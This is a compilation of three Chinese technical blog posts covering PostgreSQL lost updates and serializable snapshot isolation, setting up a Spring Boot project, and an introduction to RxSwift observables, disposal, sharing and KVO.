所谓"Lost Update"就是写写冲突。当两个并发事务同时更新同一条数据时发生。"Lost Update"必须在REPEATABLE READ 和 SERIALIZABLE 隔离级别上被避免，即拒绝并发地更新同一条数据。下面我们看看在PostgreSQL上如何处理"Lost Update"
有关PostgreSQL的UPDATE操作，我们可以看看ExecUpdate()这个函数。然而今天我们不讲具体的函数，我们形而上一点。只从理论出发。我们只讨论下UPDATE执行时的情形，这意味着，我们不讨论什么触发器啊，查询重写这些杂七杂八的，只看最"干净"的UPDATE操作。而且，我们讨论的是两个并发事务的UPDATE操作。
请看下图，下图显示了两个并发事务中UPDATE同一个tuple时的处理。


[1]目标tuple处于正在更新的状态

我们看到Tx_A和Tx_B在并发执行，Tx_A先更新了tuple，这时Tx_B准备去更新tuple，发现Tx_A更新了tuple，但是还没有提交。于是，Tx_B处于等待状态，等待Tx_A结束(commit或者abort)。
当Tx_A提交时，Tx_B解除等待状态，准备更新tuple，这时分两个情况：如果Tx_B的隔离级别是READ COMMITTED，那么OK，Tx_B进行UPDATE(可以看出，此时发生了Lost Update)。如果Tx_B的隔离级别是REPEATABLE READ或者是SERIALIZABLE，那么Tx_B会立即被abort，放弃更新。从而避免了Lost Update的发生。
当Tx_A和Tx_B的隔离级别都为READ COMMITTED时的例子：



Tx_A
Tx_B




postgres=# START TRANSACTION ISOLATION LEVEL READ COMMITTED ;START TRANSACTIONpostgres=# update test set b = b+1 where a =1;UPDATE 1postgres=# commit;COMMIT
postgres=# START TRANSACTION ISOLATION LEVEL READ COMMITTED;START TRANSACTIONpostgres=# update test set b = b+1;↓↓this transaction is being blocked↓UPDATE 1



当Tx_A的隔离级别为READ COMMITTED，Tx_B的隔离级别为REPEATABLE READ时的例子：



Tx_A
Tx_B




postgres=# START TRANSACTION ISOLATION LEVEL READ COMMITTED ;START TRANSACTIONpostgres=# update test set b = b+1 where a =1;UPDATE 1postgres=# commit;COMMIT
postgres=# START TRANSACTION ISOLATION LEVEL REPEATABLE READ;START TRANSACTIONpostgres=# update test set b = b+1;↓↓this transaction is being blocked↓ERROR:couldn't serialize access due to concurrent update




[2]目标tuple已经被并发的事务更新

我们看到Tx_A和Tx_B在并发执行，Tx_A先更新了tuple并且已经commit，Tx_B再去更新tuple时发现它已经被更新过了并且已经提交。如果Tx_B的隔离级别是READ COMMITTED，根据我们前面说的，，Tx_B在执行UPDATE前会重新获取snapshot，发现Tx_A的这次更新对于Tx_B是可见的，因此Tx_B继续更新Tx_A更新过得元组(Lost Update)。而如果Tx_B的隔离级别是REPEATABLE READ或者是SERIALIZABLE，那么显然我们会终止当前事务来避免Lost Update。
当Tx_A的隔离级别为READ COMMITTED，Tx_B的隔离级别为REPEATABLE READ时的例子：



Tx_A
Tx_B




postgres=# START TRANSACTION ISOLATION LEVEL READ COMMITTED ;START TRANSACTIONpostgres=# update test set b = b+1 where a =1;UPDATE 1postgres=# commit;COMMIT
postgres=# START TRANSACTION ISOLATION LEVEL REPEATABLE READ;START TRANSACTIONpostgres=# select * from test ; a b---+--- 1 5(1 row)postgres=# update test set b = b+1ERROR: could not serialize access due to concurrent update




[3]更新无冲突

这个很显然，没有冲突就没有伤害。Tx_A和Tx_B照常更新，不会有Lost Update。
从上面我们也可以看出，在使用SI(Snapshot Isolation)机制时，两个并发事务同时更新一条记录时，先更新的那一方获得更新的优先权。但是在下面提到的SSI机制中会有所不同，先提交的事务获得更新的优先权。

3.3 SSI(Serializable Snapshot Isolation)
SSI，可序列化快照隔离，是PostgreSQL在9.1之后，为了实现真正的SERIALIZABLE(可序列化)隔离级别而引入的。
对于SERIALIZABLE隔离级别，官方介绍如下：
可序列化隔离级别提供了最严格的事务隔离。这个级别为所有已提交事务模拟序列事务执行；就好像事务被按照序列一个接着另一个被执行，而不是并行地被执行。但是，和可重复读级别相似，使用这个级别的应用必须准备好因为序列化失败而重试事务。事实上，这个隔离级别完全像可重复读一样地工作，除了它会监视一些条件，这些条件可能导致一个可序列化事务的并发集合的执行产生的行为与这些事务所有可能的序列化（一次一个）执行不一致。这种监控不会引入超出可重复读之外的阻塞，但是监控会产生一些负荷，并且对那些可能导致序列化异常的条件的检测将触发一次序列化失败。
讲的比较繁琐，我的理解是：
1.只针对隔离级别为SERIALIZABLE的事务；
2.并发的SERIALIZABLE事务与按某一个顺序单独的一个一个执行的结果相同。
条件1很好理解，系统只判断并发的SERIALIZABLE的事务之间的冲突；
条件2我的理解就是并发的SERIALIZABLE的事务不能同时修改和读取同一个数据，否则由并发执行和先后按序列执行就会不一致。
但是这个不能同时修改和读取同一个数据要限制在多大的粒度呢？
我们分情况讨论下。

[1] 读写同一条数据

似乎没啥问题嘛，根据前面的论述，这里的一致性在REPEATABLE READ阶段就保证了，不会有问题。
以此类推，我们同时读写2,3,4....n条数据，没问题。

[2]读写闭环

啥是读写闭环？这我我造的概念，类似于操作系统中的死锁，即事务Tx_A读tuple1，更新tuple2，而Tx_B恰恰相反，读tuple2， 更新tuple1.
我们假设事务开始前的tuple1，tuple2为tuple1_1，tuple2_1,Tx_A和Tx_B更新后的tuple1，tuple2为tuple1_2，tuple2_2。
这样在并发下：
Tx_A读到的tuple1是tuple1_1，tuple2是tuple2_1。
同理，Tx_B读到的tuple1是tuple1_1，tuple2是tuple2_1。
而如果我们以Tx_A，Tx_B的顺序串行执行时，结果为：
Tx_A读到的tuple1是tuple1_1，tuple2是tuple2_1。
Tx_B读到的tuple1是tuple1_2(被Tx_A更新了)，tuple2是tuple2_1。
反之，而如果我们以Tx_B，Tx_A的顺序串行执行时，结果为：
Tx_B读到的tuple1是tuple1_1，tuple2是tuple2_1。
Tx_A读到的tuple1是tuple1_1，tuple2是tuple2_2(被Tx_B更新了)。

可以看出，这三个结果都不一样，不满足条件2，即并发的Tx_A和Tx_B不能被模拟为Tx_A和Tx_B的任意一个序列执行，导致序列化失败。
其实我上面提到的读写闭环，更正式的说法是：序列化异常。上面说的那么多，其实下面两张图即可解释。

关于这个*-conflicts我们遇到好几个了。我们先总结下：
wr-conflicts (Dirty Reads)
ww-conflicts (Lost Updates)
rw-conflicts (serialization anomaly)
下面说的SSI机制，就是用来解决rw-conflicts的。
好的，下面就开始说怎么检测这个序列化异常问题，也就是说，我们要开始了解下SSI机制了。
在PostgreSQL中，使用以下方法来实现SSI：

利用SIREAD LOCK(谓词锁)记录每一个事务访问的对象(tuple、page和relation)；
在事务写堆表或者索引元组时利用SIREAD LOCK监测是否存在冲突；
如果发现到冲突(即序列化异常)，abort该事务。

从上面可以看出，SIREAD LOCK是一个很重要的概念。解释了这个SIREAD LOCK，我们也就基本上理解了SSI。
所谓的SIREAD LOCK，在PostgreSQL内部被称为谓词锁。他的形式如下：
SIREAD LOCK := { tuple|page|relation, {txid [, ...]} }
也就是说，一个谓词锁分为两个部分：前一部分记录被"锁定"的对象(tuple、page和relation)，后一部分记录同时访问了该对象的事务的virtual txid(有关它和txid的区别，这里就不做多介绍了)。
SIREAD LOCK的实现在函数CheckForSerializableConflictOut中。该函数在隔离级别为SERIALIZABLE的事务中发生作用，记录该事务中所有DML语句所造成的影响。
例如，如果txid为100的事务读取了tuple_1，则创建一个SIREAD LOCK为{tuple_1, {100}}。此时，如果另一个txid为101的事务也读取了tuple_1，则该SIREAD LOCK升级为{tuple_1, {100，101}}。需要注意的是如果在DML语句中访问了索引，那么索引中的元组也会被检测，创建对应的SIREAD LOCK。
SIREAD LOCK的粒度分为三级：tuple|page|relation。如果同一个page中的所有tuple都被创建了SIREAD LOCK，那么直接创建page级别的SIREAD LOCK，同时释放该page下的所有tuple级别的SIREAD LOCK。同理，如果一个relation的所有page都被创建了SIREAD LOCK，那么直接创建relation级别的SIREAD LOCK，同时释放该relation下的所有page级别的SIREAD LOCK。
当我们执行SQL语句使用的是sequential scan时，会直接创建一个relation 级别的SIREAD LOCK，而使用的是index scan时，只会对heap tuple和index page创建SIREAD LOCK。
同时，我还是要说明的是，对于index的处理时，SIREAD LOCK的最小粒度是page，也就是说你即使只访问了index中的一个index tuple，该index tuple所在的整个page都被加上了SIREAD LOCK。这个特性常常会导致意想不到的序列化异常，我们可以在后面的例子中看到。
有了SIREAD LOCK的概念，我们现在使用它来检测rw-conflicts。
所谓rw-conflicts，简单地说，就是有一个SIREAD LOCK，还有分别read和write这个SIREAD LOCK中的对象的两个并发的Serializable事务。
这个时候，另外一个函数闪亮登场：CheckForSerializableConflictIn()。每当隔离级别为Serializable事务中执行INSERT/UPDATE/DELETE语句时，则调用该函数判断是否存在rw-conflicts。
例如，当txid为100的事务读取了tuple_1，创建了SIREAD LOCK ： {tuple_1, {100}}。此时，txid为101的事务更新tuple_1。此时调用CheckForSerializableConflictIn()发现存在这样一个状态： {r=100, w=101, {Tuple_1}}。显然，检测出这是一个rw-conflicts。
下面是举例时间。
首先，我们有这样一个表：
testdb=# CREATE TABLE tbl (id INT primary key, flag bool DEFAULT false);
testdb=# INSERT INTO tbl (id) SELECT generate_series(1,2000);
testdb=# ANALYZE tbl;
并发执行的Serializable事务像下面那样执行：

假设所有的SQL语句都走的index scan。这样，当SQL语句执行时，不仅要读取对应的heap tuple，还要读取heap tuple 对应的index tuple。如下图：

执行状态如下：
T1: Tx_A执行SELECT语句，该语句读取了heap tuple(Tuple_2000)和index page(Pkey2);
T2: Tx_B执行SELECT语句，该语句读取了heap tuple(Tuple_1)和index page(Pkey1);
T3: Tx_A执行UPDATE语句，该语句更新了Tuple_1;
T4: Tx_B执行UPDATE语句，该语句更新了Tuple_2000;
T5: Tx_A commit;
T6: Tx_B commit; 由于序列化异常，commit失败，状态为abort。
这时我们来看一下SIREAD LOCK的情况。

T1: Tx_A执行SELECT语句，调用CheckForSerializableConflictOut()创建了SIREAD LOCK：L1={Pkey_2,{Tx_A}} 和 L2={Tuple_2000,{Tx_A}};
T2: Tx_B执行SELECT语句，调用CheckForSerializableConflictOut创建了SIREAD LOCK：L3={Pkey_1,{Tx_B}} 和 L4={Tuple_1,{Tx_B}};
T3: Tx_A执行UPDATE语句，调用CheckForSerializableConflictIn()，发现并创建了rw-conflict ：C1={r=Tx_B, w=Tx_A,{Pkey_1,Tuple_1}}。这很显然，因为Tx_B和TX_A分别read和write这两个object。
T4: Tx_A执行UPDATE语句，调用CheckForSerializableConflictIn()，发现并创建了rw-conflict ：C1={r=Tx_A, w=Tx_B,{Pkey_2,Tuple_2000}}。到这里，我们发现C1和C2构成了precedence graph中的一个环。因此，Tx_A和Tx_B这两个事务都进入了non-serializable状态。但是由于Tx_A和Tx_B都未commit,因此CheckForSerializableConflictIn()并不会abort Tx_B(为什么不abort Tx_A？因此PostgreSQL的SSI机制中采用的是first-committer-win，即发生冲突后，先提交的事务保留，后提交的事务abort。)
T5: Tx_A commit;调用PreCommit_CheckForSerializationFailure()函数。该函数也会检测是否存在序列化异常。显然此时Tx_A和Tx_B处于序列化冲突之中，而由于发现Tx_B仍然在执行中，所以，允许Tx_A commit。
T6: Tx_B commit; 由于序列化异常，且和Tx_B存在序列化冲突的Tx_A已经被提交。因此commit失败，状态为abort。
更多更复杂的例子，可以参考这里.
前面在讨论SIREAD LOCK时，我们谈到对于index的处理时，SIREAD LOCK的最小粒度是page。这个特性会导致意想不到的序列化异常。更专业的说法是"False-Positive Serialization Anomalies"。简而言之实际上并没有发生序列化异常，但是我们的SSI机制不完善，产生了误报。
下面我们来举例说明。

对于上图，如果SQL语句走的是sequential scan，情形如下：

如果是index scan呢？还是有可能出现误报：


这篇就是这样。依然还是有很多问题没有讲清楚。留待下次再说吧(拖延症晚期)。

********************************************************************************************************************************************************************************************************
构建微服务：快速搭建Spring Boot项目
Spring Boot简介：
       Spring Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置，从而使开发人员不再需要定义样板化的配置。通过这种方式，Spring Boot致力于在蓬勃发展的快速应用开发领域(rapid application development)成为领导者（官网介绍）。
 
Spring Boot特点：
       1. 创建独立的Spring应用程序
       2. 嵌入的Tomcat，无需部署WAR文件
       3. 简化Maven配置
       4. 自动配置Spring
       5. 提供生产就绪型功能，如指标，健康检查和外部配置
       6. 绝对没有代码生成并且对XML也没有配置要求
 
 
快速入门：
       1、访问http://start.spring.io/
       2、填写相关的项目信息、jdk版本等（可参考下图）
    
       3、点击Generate Project，就会生成一个maven项目的压缩包，下载项目压缩包
       4、解压后，使用eclipse，Import -> Existing Maven Projects -> Next ->选择解压后的文件夹-> Finsh
 
项目结构介绍：
       如下图所示，Spring Boot的基础结构共三个文件：
       
       src/main/java  --程序开发以及主程序入口
       src/main/resources --配置文件
       src/test/java  --测试程序
 
 
Spring Boot推荐的项目结构：
       根目录：com.example.myproject  
       1）domain：实体类（com.example.domain）
       2）Dao：数据访问层（com.example.repository）
       3）Service：数据服务接口层（com.example.service）
            ServiceImpl：数据服务实现层（com.example.service.impl）
       4）Controller：前端控制器（com.example.controller）
       5）utils：工具类（com.example.utils）
       6）constant：常量接口类（com.example.constant）
       7）config：配置信息类（com.example.config）
       8）dto：数据传输对象（Data Transfer Object，用于封装多个实体类（domain）之间的关系，不破坏原有的实体类结构）（com.example.dto）
       9）vo：视图包装对象（View Object，用于封装客户端请求的数据，防止部分数据泄露，保证数据安全，不破坏原有的实体类结构）（com.example.vo）
 
 
引入Web模块：
       在pom.xml添加支持Web的模块

1 <dependency>
2     <groupId>org.springframework.boot</groupId>
3     <artifactId>spring-boot-starter-web</artifactId>
4 </dependency>

 
运行项目：
       1、创建controller  

 1 package com.example.annewebsite_server.controller;
 2 
 3 import org.springframework.web.bind.annotation.GetMapping;
 4 import org.springframework.web.bind.annotation.RestController;
 5 
 6 @RestController
 7 public class HelloController {
 8     @GetMapping("/hello")
 9     public String say(){
10         return "Hello Spring Boot!";
11     }
12 }

        
       
       2、启动项目入口
       
 
 
       3、项目启动成功
       
 
       4、在浏览器中进行访问（http://localhost:8080/hello）
       
       以上是一个Spring Boot项目的搭建过程，希望能够给正在学习Spring Boot的同仁带来一些些帮助，不足之处，欢迎指正。
 

********************************************************************************************************************************************************************************************************
RxSwift 入门
ReactiveX 是一个库，用于通过使用可观察序列来编写异步的、基于事件的程序。
它扩展了观察者模式以支持数据、事件序列，并添加了允许你以声明方式组合序列的操作符，同时抽象对低层线程、同步、线程安全等。
本文主要作为 RxSwift 的入门文章，对 RxSwift 中的一些基础内容、常用实践，做些介绍。
本文地址为：https://www.cnblogs.com/xjshi/p/9755095.html，转载请注明出处。
Observables aka Sequences
Basics
观察者模式（这里指Observable(Element> Sequence)和正常序列（Sequence)的等价性对于理解 Rx 是相当重要的。
每个 Observable 序列只是一个序列。Observable 与 Swift 的 Sequence 相比，其主要优点是可以异步接收元素。这是 RxSwift 的核心。

Observable(ObservableType) 与 Sequence 等价
Observable.subscribe 方法与 Sequence.makeIterator方法等价
Observer（callback）需要被传递到 Observable.subscribe 方法来接受序列元素，而不是在返回的 iterator 上调用 next() 方法

Sequence 是一个简单、熟悉的概念，很容易可视化。
人是具有巨大视觉皮层的生物。当我们可以轻松地想想一个概念时，理解它就容易多了。
我们可以通过尝试模拟每个Rx操作符内的事件状态机到序列上的高级别操作来接触认知负担。
如果我们不使用 Rx 而是使用模型异步系统（model asynchronous systems），这可能意味着我们的代码会充满状态机和瞬态，这些正式我们需要模拟的，而不是抽象。
List 和 Sequence 可能是数学家和程序员首先学习的概念之一。
这是一个数字的序列：
--1--2--3--4--5--6--|   // 正常结束
另一个字符序列：
--a--b--a--a--a---d---X     // terminates with error
一些序列是有限的，而一些序列是无限的，比如一个按钮点击的列：
---tap-tap-------tap--->
这些被叫做 marble diagram。可以在rxmarbles.com了解更多的 marble diagram。
如果我们将序列愈发指定为正则表达式，它将如下所示：
next*(error | completed)?
这描述了以下内容：

Sequence 可以有 0 个 或者多个元素
一旦收到 error 或 completed 事件，这个 Sequence 就不能再产生其他元素

在 Rx 中， Sequence 被描述为一个 push interface（也叫做 callbak）。
enum Event<Element>  {
    case next(Element)      // next element of a sequence
    case error(Swift.Error) // sequence failed with error
    case completed          // sequence terminated successfully
}

class Observable<Element> {
    func subscribe(_ observer: Observer<Element>) -> Disposable
}

protocol ObserverType {
    func on(_ event: Event<Element>)
}
当序列发送 error 或 completed 事件时，将释放计算序列元素的所有内部资源。
要立即取消序列元素的生成，并释放资源，可以在返回的订阅（subscription）上调用 dispose。
如果一个序列在有限时间内结束，则不调用 dispose 或者不使用 disposed(by: disposeBag) 不会造成任何永久性资源泄漏。但是，这些资源会一直被使用，直到序列完成（完成产生元素，或者返回一个错误）。
如果一个序列没有自行终止，比如一系列的按钮点击，资源会被永久分配，直到 dispose 被手动调用（在 disposeBag 内调用，使用 takeUntil 操作符，或者其他方式）。
使用 dispose bag 或者 takeUtil 操作符是一个确保资源被清除的鲁棒（robust）的方式。即使序列将在有限时间内终止，我们也推荐在生产环境中使用它们。
Disposing
被观察的序列（observed sequence）有另一种终止的方式。当我们使用完一个序列并且想要释放分配用于计算即将到来的元素的所有资源时，我们可以在一个订阅上调用 dispose。
这时一个使用 interval 操作符的例子：
let scheduler = SerialDispatchQueueScheduler(qos: .default)
let subscription = Observable<Int>.interval(0.3, scheduler: scheduler)
    .subscribe { event in
        print(event)
    }

Thread.sleep(forTimeInterval: 2.0)

subscription.dispose()
上边的例子打印：
0
1
2
3
4
5
注意，你通常不希望调用 dispose，这只是一个例子。手动调用 dispose 通常是一种糟糕的代码味道。dispose 订阅有更好的方式，比如 DisposeBag、takeUntil操作符、或者一些其他的机制。
那么，上边的代码是否可以在 dispose 被执行后，打印任何东西？答案是，是情况而定。

如果上边的 scheduler 是串行调度器（serial scheduler），比如 MainScheduler ，dispose 在相同的串行调度器上调用，那么答案就是 no。
否则，答案是 yes。

你仅仅有两个过程在并行执行。

一个在产生元素
另一个 dispose 订阅

“可以在之后打印某些内容吗？”这个问题，在这两个过程在不同调度上执行的情况下甚至没有意义。
如果我们的代码是这样的：
let subscription = Observable<Int>.interval(0.3, scheduler: scheduler)
            .observeOn(MainScheduler.instance)
            .subscribe { event in
                print(event)
            }

// ....

subscription.dispose() // called from main thread
在 dispose 调用返回后，不会打印任何东西。
同样，在这个例子中：
let subscription = Observable<Int>.interval(0.3, scheduler: scheduler)
            .observeOn(serialScheduler)
            .subscribe { event in
                print(event)
            }

// ...

subscription.dispose() // executing on same `serialScheduler`
在 dispose 调用返回后，也不会打印任何东西。
Dispose Bag

Dispose bags are used to return ARC like behavior to RX.

当一个 DisposeBag 被释放时，它会在每一个可被 dispose 的对象（disposables）上调用 dispose。
它没有 dispose 方法，因此不允许故意显式地调用 dispose。如果需要立即清理，我们可以创建一个新的 DisposeBag。
self.disposeBag = DisposeBag()
这将清除旧的引用，并引起资源清理。
如果仍然需要手动清理，可以使用 CompositeDisposable。它具有所需的行为，但一旦调用了 dispose 方法，它将立即处理任何新添加可被dispose的对象（disposable）。
Take until
另一种在 dealloc 时自动处理（dispose）订阅的方式是使用 takeUtil 操作符。
sequence
    .takeUntil(self.rx.deallocated)
    .subscribe {
        print($0)
    }

Implicit Observable guarantees
还有一些额外的保证，所有的序列产生者（sequence producers、Observable s），必须遵守.
它们在哪一个线程上产生元素无关紧要，但如果它们生成一个元素并发送给观察者observer.on(.next(nextElement))，那么在 observer.on 方法执行完成前，它们不能发送下一个元素。
如果 .next 事件还没有完成，那么生产者也不能发送终止 .completed 或 .error 。
简而言之，考虑以下示例：
someObservable
  .subscribe { (e: Event<Element>) in
      print("Event processing started")
      // processing
      print("Event processing ended")
  }
它始终打印：
Event processing started
Event processing ended
Event processing started
Event processing ended
Event processing started
Event processing ended
它永远无法打印：
Event processing started
Event processing started
Event processing ended
Event processing ended
Creating your own Observable (aka observable sequence)
关于观察者有一个重要的事情需要理解。
创建 observable 时，它不会仅仅因为它已创建而执行任何工作。
确实，Observable 可以通过多种方式产生元素。其中一些会导致副作用，一些会影响现有的运行过程，例如点击鼠标事件等。
但是，如果只调用一个返回 Observable 的方法，那么没有序列生成，也没有副作用。Observable仅仅定义序列的生成方法以及用于元素生成的参数。序列生成始于 subscribe 方法被调用。
例如，假设你有一个类似原型的方法：
func searchWikipedia(searchTerm: String) -> Observable<Results> {}
let searchForMe = searchWikipedia("me")

// no requests are performed, no work is being done, no URL requests were fired

let cancel = searchForMe
  // sequence generation starts now, URL requests are fired
  .subscribe(onNext: { results in
      print(results)
  })
有许多方法可以生成你自己的 Observable 序列，最简单方法或许是使用 create 函数。
RxSwift 提供了一个方法可以创建一个序列，这个序列订阅时返回一个元素。这个方法是 just。我们亲自实现一下：
func myJust<E>(_ element: E) -> Observable<E> {
    return Observable.create { observer in
        observer.on(.next(element))
        observer.on(.completed)
        return Disposables.create()
    }
}

myJust(0)
    .subscribe(onNext: { n in
      print(n)
    })
这会打印：
0
不错，create 函数是什么？
它只是一个便利方法，使你可以使用 Swift 的闭包轻松实现 subscribe 方法。像 subscribe 方法一样，它带有一个参数 observer，并返回 disposable。
以这种方式实现的序列实际上是同步的（synchronous）。它将生成元素，并在 subscribe 调用返回 disposable 表示订阅前终止。因此，它返回的 disposable 并不重要，生成元素的过程不会被中断。
当生成同步序列，通常用于返回的 disposable 是 NopDisposable 的单例。
现在，我们来创建一个从数组中返回元素的 observable。
func myFrom<E>(_ sequence: [E]) -> Observable<E> {
    return Observable.create { observer in
        for element in sequence {
            observer.on(.next(element))
        }

        observer.on(.completed)
        return Disposables.create()
    }
}

let stringCounter = myFrom(["first", "second"])

print("Started ----")

// first time
stringCounter
    .subscribe(onNext: { n in
        print(n)
    })

print("----")

// again
stringCounter
    .subscribe(onNext: { n in
        print(n)
    })

print("Ended ----")
上边的例子会打印：
Started ----
first
second
----
first
second
Ended ----
Creating an Observable that perfroms work
OK，现在更有趣了。我们来创建前边示例中使用的 interval 操作符。
这相当于 dispatch queue schedulers 的实际实现
func myInterval(_ interval: TimeInterval) -> Observable<Int> {
    return Observable.create { observer in
        print("Subscribed")
        let timer = DispatchSource.makeTimerSource(queue: DispatchQueue.global())
        timer.scheduleRepeating(deadline: DispatchTime.now() + interval, interval: interval)

        let cancel = Disposables.create {
            print("Disposed")
            timer.cancel()
        }

        var next = 0
        timer.setEventHandler {
            if cancel.isDisposed {
                return
            }
            observer.on(.next(next))
            next += 1
        }
        timer.resume()

        return cancel
    }
}
let counter = myInterval(0.1)

print("Started ----")

let subscription = counter
    .subscribe(onNext: { n in
        print(n)
    })


Thread.sleep(forTimeInterval: 0.5)

subscription.dispose()

print("Ended ----")
上边的示例会打印：
Started ----
Subscribed
0
1
2
3
4
Disposed
Ended ----
如果这样写：
let counter = myInterval(0.1)

print("Started ----")

let subscription1 = counter
    .subscribe(onNext: { n in
        print("First \(n)")
    })
let subscription2 = counter
    .subscribe(onNext: { n in
        print("Second \(n)")
    })

Thread.sleep(forTimeInterval: 0.5)

subscription1.dispose()

Thread.sleep(forTimeInterval: 0.5)

subscription2.dispose()

print("Ended ----")
那么打印如下：
Started ----
Subscribed
Subscribed
First 0
Second 0
First 1
Second 1
First 2
Second 2
First 3
Second 3
First 4
Second 4
Disposed
Second 5
Second 6
Second 7
Second 8
Second 9
Disposed
Ended ----
订阅后的每个订阅者（subscriber）同行会生成自己独立的元素序列。默认情况下，操作符是无状态的。无状态的操作符远多于有状态的操作符。
Sharing subscription and share operator
但是，如果你希望多个观察者从一个订阅共享事件（元素），该怎么办？
有两件事需要定义:

如何处理在新订阅者有兴趣观察它们之前收到的过去的元素(replay lastest only, replay all, replay last n)
如何决定何时出发共享的订阅（refCount， manual or some other algorithm)

通常是一个这样的组合，replay(1).refCount，也就是 share(replay: 1)。
let counter = myInterval(0.1)
    .share(replay: 1)

print("Started ----")

let subscription1 = counter
    .subscribe(onNext: { n in
        print("First \(n)")
    })
let subscription2 = counter
    .subscribe(onNext: { n in
        print("Second \(n)")
    })

Thread.sleep(forTimeInterval: 0.5)

subscription1.dispose()

Thread.sleep(forTimeInterval: 0.5)

subscription2.dispose()

print("Ended ----")
这将打印：
Started ----
Subscribed
First 0
Second 0
First 1
Second 1
First 2
Second 2
First 3
Second 3
First 4
Second 4
First 5
Second 5
Second 6
Second 7
Second 8
Second 9
Disposed
Ended ----
请注意现在只有一个 Subscribed 和 Disposed 事件。
对 URL 可观察对象（observable）的行为是等效的。
下面的例子展示了如何的 HTTP 请求封装在 Rx 中，这种封装非常像 interval 操作符的模式。
extension Reactive where Base: URLSession {
    public func response(_ request: URLRequest) -> Observable<(Data, HTTPURLResponse)> {
        return Observable.create { observer in
            let task = self.dataTaskWithRequest(request) { (data, response, error) in
                guard let response = response, let data = data else {
                    observer.on(.error(error ?? RxCocoaURLError.Unknown))
                    return
                }

                guard let httpResponse = response as? HTTPURLResponse else {
                    observer.on(.error(RxCocoaURLError.nonHTTPResponse(response: response)))
                    return
                }

                observer.on(.next(data, httpResponse))
                observer.on(.completed)
            }

            task.resume()

            return Disposables.create {
                task.cancel()
            }
        }
    }
}
Operator
RxSwift 实现了许多操作符。
所有操作符的的 marble diagram 可以在 ReactiveX.io 看到。
在 Playgrouds 里边几乎有所有操作符的演示。
如果你需要一个操作符，并且不知道如何找到它，这里有一个操作符的决策树。
Custom operators
有两种方式可以创建自定义的操作符。
Easy way
所有的内部代码都使用高度优化的运算符版本，因此它们不是最好的教程材料。这就是为什么我们非常鼓励使用标准运算符。
幸运的是，有一种简单的方法来创建操作符。创建新的操作符实际上就是创建可观察对象，前边的章节已经描述了如何做到这一点。
来看一下为优化的 map 操作符的实现：
extension ObservableType {
    func myMap<R>(transform: @escaping (E) -> R) -> Observable<R> {
        return Observable.create { observer in
            let subscription = self.subscribe { e in
                    switch e {
                    case .next(let value):
                        let result = transform(value)
                        observer.on(.next(result))
                    case .error(let error):
                        observer.on(.error(error))
                    case .completed:
                        observer.on(.completed)
                    }
                }

            return subscription
        }
    }
}

现在可以使用自定义的 map 了：
let subscription = myInterval(0.1)
    .myMap { e in
        return "This is simply \(e)"
    }
    .subscribe(onNext: { n in
        print(n)
    })

这将打印：
Subscribed
This is simply 0
This is simply 1
This is simply 2
This is simply 3
This is simply 4
This is simply 5
This is simply 6
This is simply 7
This is simply 8
...
Life happens
那么，如果用自定义运算符解决某些情况太难了呢？ 你可以退出 Rx monad，在命令性世界中执行操作，然后使用 Subjects 再次将结果隧道传输到Rx。
下边的例子是不应该被经常实践的，是糟糕的代码味道，但是你可以这么做。
let magicBeings: Observable<MagicBeing> = summonFromMiddleEarth()

magicBeings
  .subscribe(onNext: { being in     // exit the Rx monad
      self.doSomeStateMagic(being)
  })
  .disposed(by: disposeBag)

//
//  Mess
//
let kitten = globalParty(   // calculate something in messy world
  being,
  UIApplication.delegate.dataSomething.attendees
)
kittens.on(.next(kitten))   // send result back to rx

//
// Another mess
//
let kittens = BehaviorRelay(value: firstKitten) // again back in Rxmonad
kittens.asObservable()
  .map { kitten in
    return kitten.purr()
  }
  // ....
每一次你这样写的时候，其他人可能在其他地方写这样的代码：
kittens
  .subscribe(onNext: { kitten in
    // do something with kitten
  })
  .disposed(by: disposeBag)
所以，不要尝试这么做。
Error handling
有两种错误机制。
Asynchrouous error handling mechanism in observables
错误处理非常直接，如果一个序列以错误而终止，则所有依赖的序列都将以错误而终止。这是通常的短路逻辑。
你可以使用 catch 操作符从可观察对象的失败中恢复，有各种各样的可以让你详细指定恢复。
还有 retry 操作符，可以在序列出错的情况下重试。
KVO
KVO 是一个 Objective-C 的机制。这意味着他没有考虑类型安全，该项目试图解决这个问题的一部分。
有两种内置的方式支持 KVO：
// KVO
extension Reactive where Base: NSObject {
    public func observe<E>(type: E.Type, _ keyPath: String, options: KeyValueObservingOptions, retainSelf: Bool = true) -> Observable<E?> {}
}

#if !DISABLE_SWIZZLING
// KVO
extension Reactive where Base: NSObject {
    public func observeWeakly<E>(type: E.Type, _ keyPath: String, options: KeyValueObservingOptions) -> Observable<E?> {}
}
#endif
看一下观察 UIView 的 frame 的例子，注意 UIKit 并不遵从 KVO，但是这样可以
view
  .rx.observe(CGRect.self, "frame")
  .subscribe(onNext: { frame in
    ...
  })
或
view
  .rx.observeWeakly(CGRect.self, "frame")
  .subscribe(onNext: { frame in
    ...
  })
rx.observe
rx.observe 有更好的性能，因为它只是对 KVO 机制的包装，但是它使用场景有限。

它可用于观察从所有权图表中的self或祖先开始的 path（retainSelf = false）
它可用于观察从所有权图中的后代开始的 path（retainSelf = true）
path 必须只包含 strong 属性，否则你可能会因为在 dealloc 之前没有取消注册KVO观察者而导致系统崩溃。

例如：
self.rx.observe(CGRect.self, "view.frame", retainSelf: false)
rx.observeWeakly
rx.observeWeakly 比 rx.observe 慢一些，因为它必须在若引用的情况下处理对象释放。
它不仅适用于 rx.observe 适用的所有场景，还适用于：

因为它不会持有被观察的对象，所以它可以用来观察所有权关系位置的任意对象
它可以用来观察 weak 属性

Observing structs
KVO 是 Objective-C 的机制，所以它重度以来 NSValue 。
RxCocoa 内置支持 KVO 观察 CGRect、CGSize、CGPoint 结构体。
当观察其他结构体时，需要手动从 NSValue 中提前值。
这里有展示如何通过实现 KVORepresentable 协议，为其他的结构体扩展 KVO 观察和 *rx.observe**方法。
UI layer tips
在绑定到 UIKit 控件时，Observable 需要在 UI 层中满足某些要求。
Threading
Observable 需要在 MainScheduler 发送值，这只是普通的 UIKit/Cocoa 要求。
你的 API 最好在 MainScheduler 上返回结果。如果你试图从后台线程绑定一些东西到 UI，在 Debug build 中，RxCocoa 通常会抛出异常来通知你。
可以通过添加 observeOn(MainScheduler.instance) 来修复该问题。
Error
你无法将失败绑定到 UIKit 控件，因为这是为定义的行为。
如果你不知道 Observable 是否可以失败，你可以通过使用 catchErrorJustReturn(valueThatIsReturnedWhenErrorHappens) 来确保它不会失败，但是错误发生后，基础序列仍将完成。
